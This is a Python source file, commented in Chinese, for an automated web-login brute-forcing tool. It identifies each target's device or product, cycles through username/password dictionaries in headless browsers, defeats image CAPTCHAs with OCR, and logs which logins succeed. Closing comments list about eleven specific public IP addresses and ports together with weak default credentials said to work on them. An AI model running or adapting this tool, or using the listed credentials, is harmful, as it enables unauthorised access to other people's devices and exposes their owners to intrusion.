#!coding=u8
#========== import区 全局变量区==========
import contextlib
import ddddocr, asyncio
from datetime import datetime, timedelta
from fire import Fire
from time import sleep
from sys import stdout
from base64 import b64decode
from playwright.async_api import Playwright, async_playwright
from playwright._impl._api_types import TimeoutError, Error
from loguru import logger
from urllib3 import disable_warnings
from change_code import change_dir_txt_code

import webpass_config as glob
from webpass_func import *

#========== 数据结构 过程函数 ==========


async def oprate_browser(sema, url):
    
    url, ip = url; title = ''
    async with async_playwright() as ap:
        browser = await ap.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        async with sema:
            page = await browser.new_page()
            try:
                await page.goto(url, timeout=60*1000)
                content = await page.content()
                title = await page.title()
                err, product = search_product(content)
                return err, url, product, title
            except Error:
                err_msg = f'连接超时: {url}'
                return err_msg, url, '', title
            except Exception:
                err_msg = get_err_msg()
                logger.error(err_msg)
                return err_msg, url, '', title

def deal_oprate_result(ret):
    ''''''


async def get_product(sema, url):
    url, ip = url; title = ''
    async with async_playwright() as ap:
        browser = await ap.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        async with sema:
            page = await browser.new_page()
            try:
                await page.goto(url, timeout=60*1000)
                content = await page.content()
                title = await page.title()
                err, product = search_product(content)
                return err, url, product, title
            except Error:
                err_msg = f'连接超时: {url}'
                return err_msg, url, '', title
            except Exception:
                err_msg = get_err_msg()
                logger.error(err_msg)
                return err_msg, url, '', title

def search_product(content):
    for key, value in glob.cfg.pass_dict.items():
        if len(value['keywords']) > 0 and len(value['keywords'][0]) > 0:
            if list_all_in_str(value['keywords'], content):return 0, key
            else: continue
        elif key in content: return 0, key
        else: continue
    return 'Unknown', 'Unknown'

def deal_product_result(r):
    try:
        if len(r.result()) !=4: return
        err, url, key, title = r.result()
        if not err:
            glob.productQu.put([url, key, title])
            glob.productInt += 1
            logger.success(f"已识别: {url} -> {key}: {title}")
        

        elif err in ['Unknown']: 
            glob.unknownQu.put([url, err, title])
            logger.info(f"未识别: {url} -> {key}: {title}")


        else:
            glob.unknownQu.put([url, err, title])
            logger.error(err)
    except (TimeoutError, Error) as e:
        err_msg = f'连接超时: {url}'
        logger.error(err_msg)
        
    except Exception as e:
        logger.error(get_err_msg(3))



def create_task_list(url_pro_title_Qu):
    '''
    读文件创建任务列表，可以单线程
    解析url_pro队列，获取密码字典，添加任务到task_list_qu
    对task_list_qu的顺序进行处理，满足同一目标短期内最多试3次
    [url, pro, title, last_run_time, Queue]
    先按账号密码对应关系，再按密码循环用户
    '''
    # url_pro_title_Qu = Queue()
    while True:
        try:
            if url_pro_title_Qu.empty(): sleep(5); continue
            url, pro, title = url_pro_title_Qu.get()
            logger.debug(f"{get_call_link(3)} 获取一个目标, 开始添加任务")
            username_list = read_fileA(glob.cfg.pass_dict[pro]['user_info'][1])
            password_list = read_fileA(glob.cfg.pass_dict[pro]['pass_info'][1])

            user_pass = [[username_list[i], password_list[i]] for i in range(min(len(username_list), len(password_list)))]  # 先写一一对应的

            for _pass in password_list:
                for _user in username_list:
                    if [_user, _pass] not in user_pass:
                        user_pass.append([_user, _pass])
                    
            for usernm, passwd in user_pass:
                glob.task_list_QuA.put([url, pro, title, datetime.now()- timedelta(minutes=5), usernm, passwd])
                glob.taskcountInt += 1
                
            logger.info(f'创建任务: 已添加字典{len(user_pass)}条, 当前总任务数{glob.task_list_QuA.qsize()}个. {url}:{pro}')


        except KeyboardInterrupt as e:
            logger.info('KeyboardInterrupt');exit()

        except Exception as e:
            err_msg = get_err_msg()
            logger.error(err_msg)



def deal_task_result(r):
    ''''''
    # print(f"回调输出：{r.result() = }")


def call_brute_task(cmd, taskQu):
    while True:
        if taskQu.empty(): sleep(5); continue
        # url, pro, title, last_time, usernm, passwd = taskQu.get()
        cmd.add(do_brute_task, deal_task_result, taskQu.get())
        logger.debug(f"{get_call_link(3)} 已添加一个爆破任务, 任务数{cmd.taskQu.qsize()}")

async def fill_input(sema, url, pro, page, usernm, passwd, ocr):
    try:
        username_key = glob.cfg.pass_dict[pro]['user_info'][0]
        password_key = glob.cfg.pass_dict[pro]['pass_info'][0]
        await page.goto(url)
        page.wait_for_load_state('networkidle')
        old_content = await page.content()

        logger.debug(f"{get_call_link(3)} 填写账号密码")
        await page.locator(username_key).click()
        await page.locator(username_key).fill(usernm)
        await page.locator(password_key).click()
        await page.locator(password_key).fill(passwd)
        # page.fill(username_key, usernm)
        # page.fill(password_key, passwd)

        if len(glob.cfg.pass_dict[pro]['CAPTCHA']) == 2:
            logger.debug(f"{get_call_link(3)} 处理验证码")
            code_edit = glob.cfg.pass_dict[pro]['CAPTCHA'][0]
            code_pict = glob.cfg.pass_dict[pro]['CAPTCHA'][1]
            await page.click(code_edit)
            await page.locator(code_pict).screenshot(path='code.jpeg',quality=100,type='jpeg')
            async with open("code.jpeg", 'rb') as f:
                image = f.read()
                await asyncio.sleep(0.1)
            res = ocr.classification(image)
            await page.fill(code_edit, res)

        await page.locator(glob.cfg.pass_dict[pro]['button'][0]).click()
        logger.debug(f"{get_call_link(3)} 点击登录")
        page.wait_for_load_state('networkidle')
        # await asyncio.sleep(10)
        new_content = await page.content()
        return 0, old_content, new_content, get_equal_rate(old_content, new_content)
    except Exception:
        err_msg = get_err_msg()
        logger.error(err_msg)
        return err_msg, '', '', 0


def login_success(url, title, _user, _pass, equal_rate):
    glob.suc_login_Qu.put([url, title, _user, _pass, f'登录成功: {equal_rate}']) # 成功
    logger.success(f'{url} -> {_user} : {_pass} 登录成功: {equal_rate}')
    return True

def login_fail(url, title, _user, _pass, equal_rate):
    glob.fail_login_Qu.put([url, title, _user, _pass, f'登录失败: {equal_rate}']) # 失败
    logger.info(f'{url} -> {_user} : {_pass} 登录失败: {equal_rate}')
    return False

def login_check(url, title, _user, _pass, equal_rate):
    glob.check_login_Qu.put([url, title, _user, _pass, f'非预期值: {equal_rate}']) # 失败
    logger.info(f'{url} -> {_user} : {_pass} 非预期值: {equal_rate}')
    return False

def judge_success(url, pro, title,  _user, _pass, equal_rate, new_content):
    # sourcery skip: low-code-quality
    ''''''
    try:
        success = False
        if len(glob.cfg.pass_dict[pro]['suc']) < 1 or len(glob.cfg.pass_dict[pro]['fail']) < 1:      # 没有配置成功失败
            if 0.01 < equal_rate < 0.85:
                success = login_success(url, title, _user, _pass, equal_rate)
            else:
                success = login_fail(url, title, _user, _pass, equal_rate)

        elif len(glob.cfg.pass_dict[pro]['logic']) == 1 and glob.cfg.pass_dict[pro]['logic'][0] == 'or':
            if list_any_one_in_str(glob.cfg.pass_dict[pro]['suc'], new_content):
                success = login_success(url, title, _user, _pass, equal_rate)
                # TODO 清理掉登录成功的

            elif list_any_one_in_str(glob.cfg.pass_dict[pro]['fail'], new_content):
                success = login_fail(url, title, _user, _pass, equal_rate)
            elif 0.01 < equal_rate < 0.85:
                success = login_success(url, title, _user, _pass, equal_rate)
            else:
                success = login_check(url, title, _user, _pass, equal_rate)

        elif len(glob.cfg.pass_dict[pro]['logic']) == 1 and glob.cfg.pass_dict[pro]['logic'][0] == 'and':
            if list_all_in_str(glob.cfg.pass_dict[pro]['suc'], new_content):
                success = login_success(url, title, _user, _pass, equal_rate)
                
            elif list_all_in_str(glob.cfg.pass_dict[pro]['fail'], new_content):
                success = login_fail(url, title, _user, _pass, equal_rate)
                
            elif 0.01 < equal_rate < 0.85:
                success = login_success(url, title, _user, _pass, equal_rate)
                
            else:
                success = login_check(url, title, _user, _pass, equal_rate)
                
        return success
    
    except KeyboardInterrupt as e:
        print('KeyboardInterrupt');exit()
    
    except Exception as e:
        err_msg = get_err_msg(pl=1); logger.error(err_msg); return err_msg, 0
        
    

async def do_brute_task(sema, task_args):
    async with async_playwright() as ap:
        logger.debug(f"{get_call_link(3)} 注册浏览器")
        browser = await ap.chromium.launch(headless=True, timeout = 120000)
        context = browser.new_context(ignore_https_errors=True)
        ocr = ddddocr.DdddOcr(old=True)
        async with sema:
            logger.debug(f"{get_call_link(3)} 打开网页")
            page = await browser.new_page()
            try:
                url, pro, title, last_time, usernm, passwd = task_args          # url, pro, title, last_time, usernm, passwd = taskQu.get()
                logger.debug(f"{get_call_link(3)} 已启动爆破")
                # if wait and datetime.now() - last_run_time < timedelta(minutes=wait): return f'间隔时间太短，稍后再次执行 -> {url}'
                err, old_content, new_content, equal_rate = await fill_input(None, url, pro, page, usernm, passwd, ocr)
                logger.debug(f"{get_call_link(3)} 错误码: {err}, 登录前长度:{len(old_content)}, 登录后长度: {len(new_content)}, 前后相似度: {equal_rate:0.2f}")
                # 等待一些时间
                success = judge_success(url, pro, title,  usernm, passwd, equal_rate, new_content)

                # last_run_time = datetime.now()
                
            except (TimeoutError, Error) as e:
                err_msg = f'连接超时: {url}'
                logger.error(err_msg)
                return err_msg, url, '', title
            except Exception:
                err_msg = get_err_msg(pl=1)
                logger.error(err_msg)
                return err_msg, url, '', title
            finally:
                page.close()

def gen_code(url):
    from subprocess import Popen
    print(f'python -m playwright codegen --ignore-https-errors -b wk {url}')
    Popen(f'python -m playwright codegen --ignore-https-errors -b wk {url}')


def loop_write_file():
    change_dir_txt_code(glob.cfg.pass_dict_dir, 'utf-8')
    logger.debug(f"{get_call_link(3)} 已转换字典编码")
    while True:
        with contextlib.suppress(Exception):
            sleep(60)
            write_queue()
    
def write_queue():
    write_file(glob.cfg.unknown_device_file, glob.unknownQu.queue, 'w')
    write_file(glob.cfg.suc_login_file, glob.suc_login_Qu.queue, 'w')
    write_file(glob.cfg.fail_login_file, glob.fail_login_Qu.queue, 'w')
    write_file(glob.cfg.watch_file, glob.check_login_Qu.queue, 'w')
    logger.debug(f"{get_call_link(3)} 已记录任务结果队列")

def main(url_list = [], gen = False, wait = 0, just_discern = False):
    cmd = async_do()

    try:
        # 获取IP列表+端口，根据厂商区分？或者混排
        
        if gen: gen_code(gen); exit(0)                                      # 生成模式
        if not url_list: exit('type -h for help');                          # 帮助信息

        logger.info(f"{get_call_link(3)} 目标总数 => {len(url_list)}")
        goA(loop_write_file)        # 起一个线程专门写结果文件
        # goA(get_product, url_list)      # 起一个线程专门确定产品名称和标题
        goA(create_task_list, glob.productQu)   # 起一个线程专门创建爆破任务
        if not just_discern: goA(create_task_list, glob.unknownQu)  # 起一个线程专门创建未识别到的设备的爆破任务
        goA(call_brute_task, cmd, glob.task_list_QuA)       # 起一个线程专门执行第一次爆破任务

        # 起一个浏览器, 打开页面获取信息和爆破
        # cmd.map(oprate_browser, deal_oprate_result, url_list)
        # cmd.wait()
        
        # 获取页面信息，判断厂商，从配置中获取厂商与字典的对应，字段。并记录未识别网站
        cmd.map(get_product, deal_product_result, url_list)
        cmd.wait()

        # 等待处理结果，输出成功信息
        
        while glob.productQu.qsize()!=0 or glob.task_list_QuA.qsize()!=0 or (glob.suc_login_Qu.qsize() + glob.fail_login_Qu.qsize() + glob.check_login_Qu.qsize() < len(url_list)):
            print(f"\n{'='*50}")
            print(f"目标可识别: {glob.productInt}/{len(url_list)}, {glob.productInt/len(url_list):0.2%}, 未识别地址：{len(url_list) - glob.productInt}")
            print(f'剩余任务数: {glob.task_list_QuA.qsize()+ glob.task_list_QuB.qsize()}, 任务总数: {glob.taskcountInt}')
            print(f"成功数量: {glob.suc_login_Qu.qsize()}")
            print(f"失败或异常数量: {glob.fail_login_Qu.qsize() + glob.check_login_Qu.qsize()}")
            print('='*50)
            cmd.wait(); sleep(30); logger.debug(f'---{glob.productQu.qsize()}---{glob.task_list_QuA.qsize()}---{glob.suc_login_Qu.qsize() + glob.fail_login_Qu.qsize() + glob.check_login_Qu.qsize()} < {len(url_list)}---')
        write_queue()

    except KeyboardInterrupt as e:
        print('KeyboardInterrupt');exit()
    except Exception as e:
        logger.error(get_err_msg())
        return False,e


    

def launch(u = '', f = '', debug = False, gen = False, wait = 0, just_discern = True):
    '''
    -u: url
    -f: file
    -g: 配置模式
    -w: 单目标等待时间, 分钟
    -j: 只探测识别到的目标
    '''
    target_str = u
    if f: target_str = f"{target_str}\n{read_fileA(f, 'str')}"      #target_list.extend(get_url(read_fileA(f, 'str')))
    target_list = get_url(target_str)
    target_list = get_unique(target_list)
    logger.remove()
    logger.add(stdout, level='DEBUG' if debug else 'INFO')
    logger.add(glob.cfg.err_log_file, level="ERROR")
    # asyncio.run(main(target_list, debug = debug, gen = gen, wait = wait, just_discern = just_discern))
    main(target_list, gen = gen, wait = wait, just_discern = just_discern)


# disable_warnings()

if __name__ == '__main__':
    Fire(launch)






# 这些没探测出来：

# http://80.52.143.218:1025 存在弱口令 admin --- 123456
# http://91.235.247.118:88 存在弱口令 admin --- 123456
# http://91.222.154.123:58603 存在弱口令 admin --- 123456
# http://31.169.84.106:81 存在弱口令 admin --- admin 
# http://171.6.135.220:88 存在弱口令 admin --- 123456
# http://31.169.84.106:81 存在弱口令 admin --- 888888 
# http://109.95.32.165:85 存在弱口令 admin --- 123456
# http://213.231.6.93:85 存在弱口令 admin --- 123456
# http://151.20.32.39:58585 存在弱口令 admin --- 123456
# http://80.52.143.218:1025 存在弱口令 admin --- 123456
# http://91.235.247.118:88 存在弱口令 admin --- 123456

